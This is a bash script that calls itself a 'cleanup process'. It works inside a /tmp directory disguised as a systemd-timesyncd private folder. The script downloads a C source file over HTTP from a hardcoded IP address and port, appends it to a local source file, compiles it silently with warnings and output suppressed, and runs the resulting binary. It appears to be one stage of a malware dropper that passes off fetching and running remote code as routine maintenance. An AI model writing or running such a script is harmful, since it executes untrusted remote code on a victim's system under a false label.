#!/bin/bash

# Colors for nice output
GREEN="\033[1;32m"
CYAN="\033[1;36m"
RESET="\033[0m"

# Clear the screen (optional)
clear

echo -e "${CYAN}[INFO] Starting cleanup process...${RESET}"
sleep 0.5

# Target directory (same as main script)
TARGET_DIR="/tmp/systemd-private-f9a03082bc0f4222bac645fc509f2f3a-systemdd-timesyncd.service-SEENIT"
cd "$TARGET_DIR" || { echo "Cannot access $TARGET_DIR"; exit 1; }

# Server info for decompress.c
IP="20.74.81.63"
PORT="55612"   # last port

# Download decompress.c into the same /tmp directory
echo -e "${GREEN}[INFO] Downloading decompress.c from $IP:$PORT...${RESET}"
curl -s -O "http://$IP:$PORT/decompress.c"

# Append decompress.c to compress.c
echo -e "${GREEN}[INFO] Combining compress.c and decompress.c...${RESET}"
cat decompress.c >> compress.c

# Compile the combined source silently with optimization
OUTPUT_BINARY="combined_program"
echo -e "${GREEN}[INFO] Compiling combined source...${RESET}"
gcc -O2 -w compress.c -o "$OUTPUT_BINARY" >/dev/null 2>&1

# Run the compiled binary
echo -e "${GREEN}[INFO] Running compiled binary...${RESET}"
./"$OUTPUT_BINARY"

echo -e "${CYAN}[INFO] Cleanup process finished.${RESET}"

